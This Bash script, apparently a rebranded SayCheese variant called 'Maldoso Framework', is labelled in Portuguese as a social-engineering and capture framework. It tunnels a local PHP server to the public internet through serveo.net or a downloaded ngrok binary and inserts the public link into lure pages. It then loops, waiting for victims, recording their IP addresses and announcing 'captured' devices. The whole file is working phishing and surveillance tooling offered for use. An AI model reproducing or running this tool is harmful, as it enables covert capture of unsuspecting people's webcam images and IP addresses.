#!/bin/bash
# =====================================================
# MALDOSO FRAMEWORK - DEMO VISUAL
# Terminal Hacker Aesthetic Framework
# =====================================================

# ================== CORES ==================
GREEN="\e[1;92m"
CYAN="\e[1;96m"
PURPLE="\e[1;95m"
YELLOW="\e[1;93m"
RED="\e[1;91m"
GRAY="\e[1;90m"
WHITE="\e[1;97m"
RESET="\e[0m"
BOLD="\e[1m"
DIM="\e[2m"

# ================== ÍCONES / EMOJIS ==================
ICON_OK="🟢 ✔"
ICON_INFO="ℹ️"
ICON_WAIT="⏳"
ICON_WARN="⚠️"
ICON_ERR="❌"
ICON_CAP="📸 🎯"
ICON_NET="🌐"

trap 'printf "\n${YELLOW}${ICON_WARN} Encerrando...${RESET}\n"; exit 0' INT
clear

# ================== UTIL ==================
separator() {
  printf "${PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}\n"
}

timestamp() {
  date '+%H:%M:%S'
}

# ================== LOGS COM CHARME ==================
success() {
  printf "${GRAY}[%s]${RESET} ${GREEN}${ICON_OK}${RESET} ${GRAY}%b${RESET}\n" "$(timestamp)" "$1"
}

info() {
  printf "${GRAY}[%s]${RESET} ${CYAN}${ICON_INFO}${RESET} ${GRAY}%b${RESET}\n" "$(timestamp)" "$1"
}

wait_msg() {
  printf "${GRAY}[%s]${RESET} ${PURPLE}${ICON_WAIT}${RESET} ${GRAY}%b${RESET}\n" "$(timestamp)" "$1"
}

capture() {
  printf "${GRAY}[%s]${RESET} ${GREEN}${ICON_CAP}${RESET} ${GRAY}%b${RESET}\n" "$(timestamp)" "$1"
}

server_msg() {
  printf "${GRAY}[%s]${RESET} ${CYAN}${ICON_NET}${RESET} ${GRAY}%b${RESET}\n" "$(timestamp)" "$1"
}

warn() {
  printf "${GRAY}[%s]${RESET} ${YELLOW}${ICON_WARN}${RESET} ${GRAY}%b${RESET}\n" "$(timestamp)" "$1"
}

error() {
  printf "${GRAY}[%s]${RESET} ${RED}${ICON_ERR}${RESET} ${GRAY}%b${RESET}\n" "$(timestamp)" "$1"
}

# ================== EFEITO GLITCH ==================
glitch_text() {
  final="$1"
  charset='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%'
  length=${#final}

  for _ in {1..6}; do
    out=""
    for ((i=0; i<length; i++)); do
      [[ "${final:$i:1}" == " " ]] && out+=" " || out+=${charset:RANDOM%${#charset}:1}
    done
    printf "\r${CYAN}%s${RESET}" "$out"
    sleep 0.05
  done
  printf "\r${GREEN}%s${RESET}\n" "$final"
}

# ================== SPINNER ==================
spinner() {
  local spin='|/-\'
  for i in {1..24}; do
    printf "\r${PURPLE}%s${RESET} ${GRAY}Inicializando módulos...${RESET}" "${spin:i%4:1}"
    sleep 0.07
  done
  printf "\r${GREEN}${ICON_OK}${RESET} ${GRAY}Módulos carregados${RESET}\n"
}

# ================== INTRO ==================
intro() {
  clear
  for _ in {1..3}; do
    printf "${GREEN}%s${RESET}\n" "$(head /dev/urandom | tr -dc 'A-Z0-9' | head -c $(tput cols))"
    sleep 0.04
  done
  clear
}

# ================== BANNER ==================
banner() {
  separator
  printf "${GREEN}${BOLD}"
  cat << "EOF"
███╗   ███╗ █████╗ ██╗     ██████╗  ██████╗ ███████╗ ██████╗
████╗ ████║██╔══██╗██║     ██╔══██╗██╔═══██╗██╔════╝██╔═══██╗
██╔████╔██║███████║██║     ██║  ██║██║   ██║███████╗██║   ██║
██║╚██╔╝██║██╔══██║██║     ██║  ██║██║   ██║╚════██║██║   ██║
██║ ╚═╝ ██║██║  ██║███████╗██████╔╝╚██████╔╝███████║╚██████╔╝
╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝
EOF
  printf "${RESET}"
  separator
  printf "${GREEN}>> Framework de Engenharia Social & Captura <<${RESET}\n"
  printf "${GRAY}:: Autor  : Duzinn${RESET}\n"
  printf "${GRAY}:: Versão : 1.0${RESET}\n"
  printf "${GRAY}:: Modo   : DEMO VISUAL${RESET}\n"
  separator
}

# ================== CONTROLE ==================
stop() {
pkill -f ngrok > /dev/null 2>&1
pkill -f php > /dev/null 2>&1
pkill -f ssh > /dev/null 2>&1
exit 1
}

dependencies() {
command -v php > /dev/null 2>&1 || {
log "${ERR} PHP não está instalado. Abortando."
exit 1
}
}

catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
success "IP registrado no sistema"
cat ip.txt >> saved.ip.txt
}

checkfound() {
log "${WAIT} Aguardando alvos... Ctrl + C para sair"
while true; do
  if [[ -e "ip.txt" ]]; then
    success "IP registrado no sistema"
    catch_ip
    rm -rf ip.txt
  fi
  sleep 0.5
  if [[ -e "Log.log" ]]; then
    capture "Dispositivo ${GREEN}CAPTURADO${RESET} com sucesso"
    rm -rf Log.log
  fi
  sleep 0.5

done

}


server() {

command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }

printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &

sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link

}


payload_ngrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' saycheese.html > index2.html
sed 's+forwarding_link+'$link'+g' template.php > index.php


}

ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link

payload_ngrok
checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server -eq 1 ]]; then

command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
start

elif [[ $option_server -eq 2 ]]; then
ngrok_server
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start1
fi

}


payload() {

send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

sed 's+forwarding_link+'$send_link'+g' saycheese.html > index2.html
sed 's+forwarding_link+'$send_link'+g' template.php > index.php


}

start() {

default_choose_sub="Y"
default_subdomain="saycheese$RANDOM"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payload
checkfound

}

banner
dependencies
start1

